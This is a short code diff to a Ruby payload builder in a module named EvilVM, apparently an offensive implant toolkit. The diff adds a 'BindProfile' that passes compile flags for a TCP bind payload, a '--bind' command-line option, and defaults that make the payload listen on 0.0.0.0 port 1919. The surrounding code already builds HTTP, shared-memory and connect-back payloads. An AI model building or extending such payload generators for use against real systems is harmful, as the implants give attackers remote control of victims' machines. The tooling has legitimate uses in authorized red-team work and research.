@@ -43,6 +43,16 @@ module EvilVM
     end
   end
 
+  class BindProfile < BaseProfile
+    def initialize(ip, port)
+      super()
+      @flags = [
+        "-DIOBIND",
+        "-DIPADDR=#{ip.split(/\./).join(",")}",
+        "-DPORT=#{port}"]
+    end
+  end
+
   class HTTPProfile < BaseProfile
     def initialize()
       super()
@@ -274,6 +284,7 @@ if $0 == __FILE__
     opts.on("-s", "--streams", "Build std streams payload") { |p| options[:payload] = :stdio }
     opts.on("-H", "--http", "Build HTTP payload") { |p| options[:payload] = :httpio }
     opts.on("-m", "--memio", "Build shared memory payload") { |p| options[:payload] = :memio }
+    opts.on("-b", "--bind", "Build TCP bind payload") { |p| options[:payload] = :bindio }
 
     opts.separator ""
     opts.separator "Transport Options:"
@@ -360,6 +371,8 @@ if $0 == __FILE__
   when :netio
     profile = EvilVM::NetProfile.new(options[:ip], options[:port])
     profile.connectwait = options[:interval] || 1000
+  when :bindio
+    profile = EvilVM::BindProfile.new(options[:ip] || "0.0.0.0", options[:port] || 1919)
   when :httpio
     profile = EvilVM::HTTPProfile.new()
     profile.uri = options[:uri] || "/feed"
